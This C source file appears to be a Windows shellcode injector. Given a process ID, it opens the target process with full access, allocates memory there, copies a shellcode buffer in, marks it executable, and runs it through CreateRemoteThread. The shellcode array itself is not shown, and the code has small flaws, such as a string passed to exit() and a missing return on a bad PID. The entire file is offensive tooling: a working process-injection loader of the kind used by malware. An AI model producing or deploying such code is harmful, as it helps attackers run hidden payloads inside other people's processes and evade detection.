int main(int argc, char* argv[]) {
	
	HANDLE	hTargetProcess,
			hThread;
	PVOID	pRemoteShellcode;
	DWORD	dwPid,
			dwThreadId,
			dwOldProtection;
	SIZE_T	dwBytesWritten;

	if ( argc != 2 ) {
		msg("Usage: %s <pid>", argv[0]);
		return -1;
	}

	if ( (dwPid = atoi(argv[1])) == 0 ) {
		msg("Could not convert %s to a pid", argv[1]);
	}

	/* Get a handle to the target process */
	if ( (hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) == NULL ) {
		exit("Could not open handle to target process.");
	}

	msg("Acquired handle to process with id %d", dwPid);

	/* Allocate memory in the target process to hold the shellcode */
	if ( (pRemoteShellcode = VirtualAllocEx(hTargetProcess, 0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == NULL ) {
		error("Could not allocate memoroy in target process.");
		goto Cleanup;
	}

	msg("Allocated memory in target process starting at 0x%p", pRemoteShellcode);

	/* Write the shellcode to the buffer in the target process */
	if ( !WriteProcessMemory(hTargetProcess, pRemoteShellcode, shellcode, sizeof(shellcode), &dwBytesWritten) ) {
		error("Could not write shellcode to target process.");
		goto Cleanup;
	}

	msg("Wrote shellcode to 0x%p in target process", pRemoteShellcode);

	/* Set the buffers memory permissions to RX */
	if ( !VirtualProtectEx(hTargetProcess, pRemoteShellcode, sizeof(shellcode), PAGE_EXECUTE_READ, &dwOldProtection) ) {
		msg("Could not set memory protections for shellcode at 0x%p to executable.", pRemoteShellcode);
		goto Cleanup;
	}

	/* Start a new thread in the remote process to execute the shellcode */
	if ( (hThread = CreateRemoteThread(hTargetProcess, 0, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, 0, 0, &dwThreadId)) == NULL ) {
		error("Could not create remote thread to execute shellcode in target process.");
		goto Cleanup;
	}

	msg("Executed shellcode in target process. Awaiting thread completion...");

	/* Cleanup */
	WaitForSingleObject(hThread, INFINITE);
	msg("Shellcode execution completed.");
Cleanup:
	CloseHandle(hTargetProcess);

	return 0;
}